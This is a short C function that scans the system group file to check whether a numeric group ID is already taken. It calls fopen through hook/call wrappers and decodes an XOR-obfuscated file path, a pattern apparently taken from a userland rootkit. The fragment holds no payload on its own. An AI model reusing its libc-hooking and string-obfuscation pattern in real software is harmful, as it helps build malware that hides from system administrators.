int idtaken(const id_t newid){
    int taken = 0;

    hook(CFOPEN);
    char *group = xordup(GROUP_PATH);
    FILE *fp = call(CFOPEN, group, "r");
    clean(group);
    if(fp == NULL)
        return -1;

    char line[LINE_MAX];
    while(fgets(line, sizeof(line), fp) != NULL && !taken){
        line[strlen(line)-1]='\0';
        int c = 0;
        char *linedup = strdup(line);
        if(!linedup){
            fclose(fp);
            return -1;
        }
        char *linetok = strtok(linedup, ":");
        while(linetok != NULL && !taken){
            if(c++ == 2 && (id_t)atoi(linetok) == newid)
                taken = 1;
            linetok = strtok(NULL, ":");
        }
        clean(linedup);
    }
    fclose(fp);

    return taken;
}